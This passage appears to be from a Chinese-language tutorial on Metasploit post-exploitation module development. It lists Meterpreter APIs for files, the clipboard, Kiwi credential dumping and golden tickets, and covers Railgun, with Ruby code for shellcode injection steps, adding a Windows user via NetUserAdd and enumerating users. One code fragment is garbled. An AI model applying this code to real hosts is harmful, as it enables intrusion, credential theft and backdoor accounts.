execute_shellcode | 执行shellcode  
inject_unhook | 注入释放钩子  
has_pid | pid是否存在  
### 执行shellcode
  1. 获取当前的pid：session.sys.process.getpid
  2. 打开进程得到进程句柄：host = session.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
  3. 申请内存：shell_addr = host.memory.allocate(shellcode.length)
  4. 保护当前地址：host.memory.protect(shell_addr)
  5. 向地址写入shellcode：host.memory.write(shell_addr, shellcode) 
  6. 执行shellcode：host.thread.create(shell_addr,0)
## 文件系统操作
    include Msf::Post::File
    lib/rex/post/dir.rb
    lib/rex/post/file_stat.rb
    lib/rex/post/file.rb
    lib/rex/post/meterpreter/extensions/stdapi/fs/file_stat.rb
### 文件操作
  * **session.fs.file.**
    lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb
函数 | 描述  
---|---  
separator | 获取系统目录路径的分隔符\  
expand_path | 解析环境变量形式的文件路径'%appdata%'  
rm，delete | 删除文件  
new | 新建文件返回一个句柄  
rename，mv | 重命名文件  
download | 下载远程文件到本地  
stat | 文件信息  
move，mv | 移动文件  
search | 搜索文件  
chmod | 修改文件属性  
exist | 文件是否存在  
open | 打开文件返回一个句柄  
download_file | 下载远程单文件到本地  
copy，cp | 拷贝文件  
file_local_write | 写文件到本地  
upload_file | 上传单文件到远程  
write_file | 写文件到远程  
sha1 | 获取文件的sha1  
md5 | 获取文件的md5  
### 文件夹操作
  * **session.fs.dir**
    lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb
函数 | 描述  
---|---  
entries，ls | 列出当前文件夹里的文件  
entries_with_info | 列出当前文件夹里的文件，带文件的详细信息  
mkdir | 新建目录  
match | 匹配文件  
foreach | 枚举文件夹  
chdir | 切换到目录，就是cd  
pwd，getwd | 显示当前目录路径  
delete，rmdir，unlink | 删除文件夹  
download | 递归下载远程文件夹到本地  
upload | 递归上传本地文件夹到远程  
|  
  * 获取文件的详细信息
    session.fs.file.stat
## 剪切板管理
    lib/rex/post/meterpreter/extensions/extapi/clipboard/clipboard.rb
    lib/rex/post/meterpreter/ui/console/command_dispatcher/extapi/clipboard.rb
    include Msf::Post::Windows::ExtAPI
模块名称 | 描述  
---|---  
session.extapi.clipboard.set_text | 设置剪切板文本  
session.extapi.clipboard.get_data | 获取剪切板数据`-d`下载非文本数据  
monitor_start | 开始监控  
monitor_pause | 暂停监控  
monitor_dump | 导出监控内容  
monitor_resume | 重新监控  
monitor_purge | 清除监控  
monitor_stop | 停止监控  
## WMIC
include Msf::Post::Windows::WMIC
模块名称 | 描述  
---|---  
wmic_query | 查询wmic  
wmic_command | 执行wmic命令  
wmic_user_pass_string | smbexec  
## Runas
Msf::Post::Windows::Runas
模块名称 | 描述  
---|---  
shell_execute_exe | 执行exe  
shell_execute_psh | 执行PowerShell  
shell_exec | 执行命令  
create_process_with_logon | 以登录用户创建进程  
create_process_as_user | 以指定用户创建进程  
## Kiwi
Msf::Post::Windows::Kiwi
模块名称 | 描述  
---|---  
password_change | 修改密码  
dcsync | 同步域控  
dcsync_ntlm | 同步域控NTLM  
lsa_dump_secrets | 导出secrets  
lsa_dump_sam | 导出sam  
lsa_dump_cache | 导出cache  
creds_all | 获取全部凭证  
kerberos_ticket_list | 列出kerberos票据  
kerberos_ticket_use | 使用kerberos票据  
kerberos_ticket_purge | 清除kerberos票据  
golden_ticket_create | 创建黄金票据  
wifi_list | 列出WiFi凭证  
## ShadowCopy
Msf::Post::Windows::ShadowCopy
模块名称 | 描述  
---|---  
vss_list | 列出卷影备份  
vss_get_ids | 获取卷影备份的id  
vss_get_storage | 获取卷影备份储存的参数  
get_sc_details | 列出指定id卷影备份的详细信息  
get_sc_param | 获取制定id卷影备份的参数信息  
vss_get_storage_param | 获取卷影备份储存的指定参数  
vss_set_storage | 设置卷影备份储存  
create_shadowcopy | 创建卷影备份  
start_vss | 启动卷影备份  
## LDAP
Msf::Post::Windows::LDAP
  * 这个我不会！下次一定！
## RailGun
    lib/msf/core/post/windows/railgun.rb
    lib/rex/post/meterpreter/extensions/stdapi/railgun/library.rb
    lib/rex/post/meterpreter/extensions/stdapi/railgun/library_function.rb
模块名称 | 描述  
---|---  
known_library_names | 列出可用DLL  
memread | 读内存  
memwrite | 写内存  
add_function | 添加函数  
add_library，add_dll | 添加库  
get_library，get_dll | 获取库，判断存不存在  
multi | 执行多个函数，数组形式  
const | 获取常量  
lookup_error | lookup_error  
pointer_size | 获取指针大小，x86与x64的差别  
### 数据类型
      @@allowed_datatypes = {
        'VOID'   => ['return'],
        'BOOL'   => ['in', 'return'],
        'DWORD'  => ['in', 'return'],
        'WORD'   => ['in', 'return'],
        'BYTE'   => ['in', 'return'],
        'LPVOID' => ['in', 'return'], # sf: for specifying a memory address (e.g. VirtualAlloc/HeapAlloc/...) where we don't want to back it up with actual mem ala PBLOB
        'HANDLE' => ['in', 'return'],
        'SIZE_T' => ['in', 'return'],
        'PDWORD' => ['in', 'out', 'inout'], # todo: support for functions that return pointers to strings
        'PWCHAR' => ['in', 'out', 'inout'],
        'PCHAR'  => ['in', 'out', 'inout'],
        'PBLOB'  => ['in', 'out', 'inout'],
      }.freeze
      @@allowed_convs = ['stdcall', 'cdecl']
      @@directions = ['in', 'out', 'inout', 'return'].freeze
  * 在下面文件有详细的转换对应关系
    lib/rex/post/meterpreter/extensions/stdapi/railgun/util.rb
    VOID, BOOL, DWORD, WORD, BYTE, LPVOID, HANDLE, PDWORD, PWCHAR, PCHAR, PBLOB
  * 如果是指针数据类型的要使用：PBLOB类型，返回来的使用unpack解析，pack之后作为参数传进。
C语言 | Railgun | 描述  
---|---|---  
LPCWSTR，LPWSTR | PWCHAR |  
DWORD | DWORD |  
LPCSTR | PCHAR |  
*LPVOID | PBLOB | 指针各种奇怪的数据类型  
*DWORD，LPDWORD | PDWORD | 一般是一个指针地址DWORD，返回值存储变量的地址  
VOID | VOID | VOID返回类型  
BOOL | BOOL |  
WORD | WORD | 一般是常量，bits  
BYTE | BYTE |  
PSID | LPVOID | 指针内存  
HANDLE | HANDLE | 句柄  
    #process return value
    case function.return_type
      when 'LPVOID', 'HANDLE'
        if( @native == 'Q  versions//aa383749(v=vs.85)?redirectedfrom=MSDN>
### 添加用户例子
  * C代码
>  netuseradd>
    NET_API_STATUS NET_API_FUNCTION NetUserAdd(
      LPCWSTR servername,
      DWORD   level,
      LPBYTE  buf,
      LPDWORD parm_err
    );
  * 在文件`lib/rex/post/meterpreter/extensions/stdapi/railgun/def/windows/def_netapi32.rb`添加函数。
    dll.add_function('NetUserAdd', 'DWORD', [
        ["PWCHAR","servername","in"],
        ["DWORD","level","in"],
        ["PBLOB","buf","in"],
        ["PDWORD","parm_err","out"]
        ])
  * 你会发现`level`这个参数他是一个结构体，和上面介绍的几种数据类型都对不上，怎么把`level`传给`NetUserAdd`呢？Ruby里有一个pack可以封装结构体，pack就是告诉railgun在内存中怎么解析这串东西。
>  user_info_1>
  * 结构体
    typedef struct _USER_INFO_1 {
      LPWSTR usri1_name;
      LPWSTR usri1_password;
      DWORD  usri1_password_age;
      DWORD  usri1_priv;
      LPWSTR usri1_home_dir;
      LPWSTR usri1_comment;
      DWORD  usri1_flags;
      LPWSTR usri1_script_path;
    } USER_INFO_1, *PUSER_INFO_1, *LPUSER_INFO_1;
  * 上面有5个LPWSTR类型的变量，因为它是一个指针类型，在x86架构里的指针寻址32位，用pack封装的时候全部使用V就可以了，V在ruby的pack中表示：小端字节顺序的unsigned long (32bit 无符号整数)；在x64架构里寻址位数就不一样了，所以这个结构体在内存就会不一样，所以封装的时候就要使用Q，Q在ruby的pack中表示：小端字节顺序unsigned long long(64bit 无符号整数)。这个问题我用x64dbg调了一天[捂脸]。
    def add_user(username, password, server_name = nil)
        addr_username = session.railgun.util.alloc_and_write_wstring(username)
        addr_password = session.railgun.util.alloc_and_write_wstring(password)
        #  Set up the USER_INFO_1 structure.
        #  https://docs.microsoft.com/en-us/windows/win32/api/Lmaccess/ns-lmaccess-user_info_1
        user_info = [
            addr_username,
            addr_password,
            0x0,
            0x1,
            0x0,
            0x0,
            client.railgun.const('UF_SCRIPT | UF_NORMAL_ACCOUNT|UF_DONT_EXPIRE_PASSWD'),
            0x0
            ].pack(client.arch == "x86" ? "VVVVVVVV" : "QQVVQQVQ")
        result = client.railgun.netapi32.NetUserAdd(server_name, 1, user_info, 4)
        client.railgun.multi([
            ["kernel32", "VirtualFree", [addr_username, 0, MEM_RELEASE]], #  addr_username
            ["kernel32", "VirtualFree", [addr_password, 0, MEM_RELEASE]], #  addr_password
            ])
        return result
    end
### 解析返回数据
  * 上面的传参一个解决了，解析数据可以使用unpack，或者有别人在util写好的函数
### 枚举用户
  * C代码
>  netuserenum>
    NET_API_STATUS NET_API_FUNCTION NetUserEnum(
      LPCWSTR servername,
      DWORD   level,
      DWORD   filter,
      LPBYTE  *bufptr,
      DWORD   prefmaxlen,
      LPDWORD entriesread,
      LPDWORD totalentries,
      PDWORD  resume_handle
    );
  * 添加函数
    dll.add_function('NetUserEnum', 'DWORD', [
        ["PWCHAR","servername","in"],
        ["DWORD","level","in"],
        ["DWORD","filter","in"],
        ["PBLOB","bufptr","out"],
        ["DWORD","prefmaxlen","in"],
        ["PDWORD","entriesread","out"],
        ["PDWORD","totalentries","out"],
        ["PDWORD","ResumeHandle","inout"],
        ])
    def enum_user(server_name = nil)
        users = []
        filter = 'FILTER_NORMAL_ACCOUNT|FILTER_TEMP_DUPLICATE_ACCOUNT'
        result = client.railgun.netapi32.NetUserEnum(server_name, 0, client.railgun.const(filter), 4, 4096, 4, 4, 0)
        if (result['return'] == 0) && ((result['totalentries'] % 4294967296) != 0)
            begin
                user_info_addr = result['bufptr'].unpack1("V")
                unless user_info_addr == 0
                    user_info = session.railgun.util.read_array(USER_INFO, (result['totalentries'] % 4294967296), user_info_addr)
                    for member in user_info
                        users << member["usri0_name"]
                    end
                    return users
                end
            end
        else
            return users
        end
        ensure
        session.railgun.netapi32.NetApiBufferFree(user_info_addr)
    end
可以看一下我提交的[PR](https://github.com/rapid7/metasploit-framework/pull/12988)，上面Railgun的用法我在这个推送请求都用上了
* * *